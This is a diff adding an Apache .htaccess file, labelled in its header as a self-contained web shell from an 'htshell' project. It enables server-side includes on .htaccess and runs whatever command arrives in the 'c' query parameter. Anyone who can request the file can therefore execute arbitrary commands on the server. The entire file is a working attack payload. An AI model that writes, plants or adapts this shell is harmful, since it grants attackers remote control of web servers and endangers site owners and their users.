@@ -1,0 +1,14 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+    SetOutputFilter INCLUDES
+</Files>
+
+Options +Includes
+AddHandler text/html .htaccess
+AddOutputFilter INCLUDES .htaccess
+
+#SHELL<!--#exec cmd="echo ''" --><!--#if expr="$QUERY_STRING_UNESCAPED = /^c=(.*)$/" --><!--#set var="cmd" value="$1 2>&1" --><!--#else --><!--#set var="cmd" value="echo 'Regex failed'" --><!--#endif --><!--#exec cmd="$cmd"-->LLEHS#
